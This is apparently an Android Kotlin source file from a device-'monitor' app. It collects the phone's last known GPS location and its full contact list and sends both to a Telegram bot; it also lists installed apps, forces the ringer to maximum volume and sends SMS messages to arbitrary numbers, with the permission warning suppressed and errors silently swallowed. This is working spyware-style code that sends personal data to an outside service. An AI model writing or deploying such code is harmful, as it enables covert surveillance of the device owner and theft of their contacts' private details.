package com.dec.monitor.system

import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.location.LocationManager
import android.media.AudioManager
import android.media.RingtoneManager
import android.os.BatteryManager
import android.provider.ContactsContract
import android.telephony.SmsManager
import com.dec.monitor.TelegramBot
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import java.io.File
import java.io.FileWriter

object DeviceInfo {

    fun getBatteryInfo(context: Context): String {
        val intent = context.registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED))
        val level = intent?.getIntExtra(BatteryManager.EXTRA_LEVEL, -1) ?: -1
        val scale = intent?.getIntExtra(BatteryManager.EXTRA_SCALE, -1) ?: -1
        val pct = if (scale > 0) (level * 100 / scale) else -1
        val status = intent?.getIntExtra(BatteryManager.EXTRA_STATUS, -1)
        val charging = status == BatteryManager.BATTERY_STATUS_CHARGING ||
                status == BatteryManager.BATTERY_STATUS_FULL
        val plugged = intent?.getIntExtra(BatteryManager.EXTRA_PLUGGED, -1)
        val plugType = when (plugged) {
            BatteryManager.BATTERY_PLUGGED_USB -> "USB"
            BatteryManager.BATTERY_PLUGGED_AC -> "AC"
            BatteryManager.BATTERY_PLUGGED_WIRELESS -> "Wireless"
            else -> "Not charging"
        }
        return "$pct% — ${if (charging) "Charging ($plugType)" else "Not charging"}"
    }

    suspend fun getLocation(context: Context) = withContext(Dispatchers.IO) {
        try {
            val lm = context.getSystemService(Context.LOCATION_SERVICE) as LocationManager
            val providers = lm.getProviders(true)
            var bestLat = 0.0
            var bestLon = 0.0
            var found = false

            for (provider in providers) {
                try {
                    @Suppress("MissingPermission")
                    val loc = lm.getLastKnownLocation(provider)
                    if (loc != null) {
                        bestLat = loc.latitude
                        bestLon = loc.longitude
                        found = true
                        break
                    }
                } catch (e: Exception) { continue }
            }

            if (found) {
                val mapsUrl = "https://maps.google.com/?q=$bestLat,$bestLon"
                TelegramBot.sendMessage("📍 <b>Location</b>\nLat: $bestLat\nLon: $bestLon\n<a href=\"$mapsUrl\">Open in Maps</a>")
            } else {
                TelegramBot.sendMessage("📍 Location unavailable — GPS may be off")
            }
        } catch (e: Exception) {
            TelegramBot.sendMessage("📍 Location error: ${e.message}")
        }
    }

    suspend fun getContacts(context: Context) = withContext(Dispatchers.IO) {
        try {
            val sb = StringBuilder()
            val cursor = context.contentResolver.query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                arrayOf(
                    ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                    ContactsContract.CommonDataKinds.Phone.NUMBER
                ),
                null, null,
                ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC"
            )

            cursor?.use {
                while (it.moveToNext()) {
                    val name = it.getString(0) ?: "Unknown"
                    val number = it.getString(1) ?: ""
                    sb.appendLine("$name — $number")
                }
            }

            val file = File(context.cacheDir, "contacts.txt")
            FileWriter(file).use { it.write(sb.toString()) }
            TelegramBot.sendDocument(file, "📒 Contacts — ${sb.lines().size} entries")
        } catch (e: Exception) {
            TelegramBot.sendMessage("📒 Contacts error: ${e.message}")
        }
    }

    fun getInstalledApps(context: Context): String {
        val pm = context.packageManager
        val packages = pm.getInstalledApplications(0)
        return packages
            .filter { pm.getLaunchIntentForPackage(it.packageName) != null }
            .joinToString("\n") { pm.getApplicationLabel(it).toString() }
            .take(3000)
    }

    fun ringDevice(context: Context) {
        try {
            val am = context.getSystemService(Context.AUDIO_SERVICE) as AudioManager
            am.ringerMode = AudioManager.RINGER_MODE_NORMAL
            am.setStreamVolume(AudioManager.STREAM_RING, am.getStreamMaxVolume(AudioManager.STREAM_RING), 0)
            val ringtone = RingtoneManager.getRingtone(
                context,
                RingtoneManager.getDefaultUri(RingtoneManager.TYPE_RINGTONE)
            )
            ringtone.play()
        } catch (e: Exception) { }
    }

    fun sendSms(context: Context, number: String, message: String) {
        try {
            val smsManager = SmsManager.getDefault()
            val parts = smsManager.divideMessage(message)
            smsManager.sendMultipartTextMessage(number, null, parts, null, null)
        } catch (e: Exception) { }
    }
}
